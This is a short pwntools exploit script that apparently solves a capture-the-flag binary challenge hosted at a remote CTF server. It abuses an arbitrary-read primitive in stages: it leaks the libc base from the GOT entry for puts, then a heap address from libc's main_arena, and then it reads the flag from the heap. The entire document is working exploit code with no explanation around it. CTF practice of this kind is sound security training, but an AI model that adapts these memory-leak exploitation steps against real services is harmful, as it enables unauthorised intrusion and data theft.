from pwn import *

elf = ELF('./chall')
libc = ELF('./libc.so.6')

io = remote('tcp.sasc.tf', 2200)

def AR(address: int):
    io.sendlineafter(b'): ', hex(address).encode()[2:])
    io.recvuntil(b": ")
    return io.recvline()[:-1]

# ======= STAGE 1: LEAK LIBC =======
puts_addr = u64(AR(0x403FA8).ljust(8, b'\x00'))
libc.address = puts_addr - libc.sym['puts']
log.success(f"libc addr: {hex(libc.address)}")

# ======= STAGE 2: LEAK HEAP =======
heap_addr = u64(AR(libc.symbols['main_arena'] + 96).ljust(8, b'\x00')) - 0x470
log.success(f"heap addr: {hex(heap_addr)}")

# ======= STAGE 3: GET FLAG =======
log.success(f"flag: {AR(heap_addr + 0x480)}")

io.interactive()
